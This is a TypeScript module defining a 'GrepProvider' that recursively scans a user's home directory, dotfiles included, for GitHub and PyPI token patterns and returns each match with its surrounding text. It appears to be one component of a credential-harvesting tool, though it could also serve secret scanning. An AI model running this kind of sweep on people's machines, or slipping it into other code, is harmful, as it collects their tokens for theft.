// grep.ts — fast file grep for credential patterns (pure JS)

import { readFileSync } from "fs";
import { homedir } from "os";

import { Provider } from "../base";
import type { ProviderResult } from "../types";

// ---------------------------------------------------------------------------
// Patterns
// ---------------------------------------------------------------------------

const PATTERNS: RegExp[] = [
  /ghp_[A-Za-z0-9_]{36,}/g,
  /gho_[A-Za-z0-9_]{36,}/g,
  /pypi-[A-Za-z0-9+/=_-]{40,}/g,
];

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

export interface GrepMatch {
  path: string;
  excerpt: string;
}

// ---------------------------------------------------------------------------
// Internal grep helpers
// ---------------------------------------------------------------------------

function grepFile(filePath: string): GrepMatch[] {
  try {
    const buf = readFileSync(filePath);
    const size = buf.length;

    if (size === 0 || size > 50 * 1024 * 1024) return [];

    // Binary check: null bytes in first 4KB
    const checkLen = Math.min(size, 4096);
    for (let i = 0; i < checkLen; i++) {
      if (buf[i] === 0) return [];
    }

    const text = buf.toString("utf-8");
    const results: GrepMatch[] = [];

    for (const re of PATTERNS) {
      re.lastIndex = 0;
      let m: RegExpExecArray | null;
      while ((m = re.exec(text)) !== null) {
        const start = Math.max(0, m.index - 20);
        const end = Math.min(text.length, m.index + m[0].length + 200);
        const excerpt = text.slice(start, end).replace(/[\r\n]/g, " ");
        results.push({ path: filePath, excerpt });
        if (results.length >= 20) break;
      }
    }
    return results;
  } catch {
    return [];
  }
}

async function grepDirectory(
  root: string,
  maxFiles = 5000,
): Promise<GrepMatch[]> {
  const results: GrepMatch[] = [];
  const glob = new Bun.Glob("**/*");
  let scanned = 0;

  for await (const relPath of glob.scan({
    cwd: root,
    absolute: true,
    dot: true,
    onlyFiles: true,
  })) {
    if (scanned >= maxFiles) break;
    scanned++;

    try {
      results.push(...grepFile(relPath));
    } catch {
      // Permission errors, dangling symlinks, etc.
    }
  }

  return results;
}

// ---------------------------------------------------------------------------
// GrepProvider
// ---------------------------------------------------------------------------

export class GrepProvider extends Provider {
  private root: string;
  private maxFiles: number;

  constructor(root: string = homedir(), maxFiles = 5000) {
    // No patterns passed to base — we handle matching internally and
    // return GrepMatch[] as the data payload.
    super("grep", "filesystem-grep", undefined, "aggressive");
    this.root = root;
    this.maxFiles = maxFiles;
  }

  async execute(): Promise<ProviderResult> {
    try {
      const matches = await grepDirectory(this.root, this.maxFiles);
      return this.success(matches);
    } catch (err) {
      return this.failure(err instanceof Error ? err : String(err));
    }
  }
}
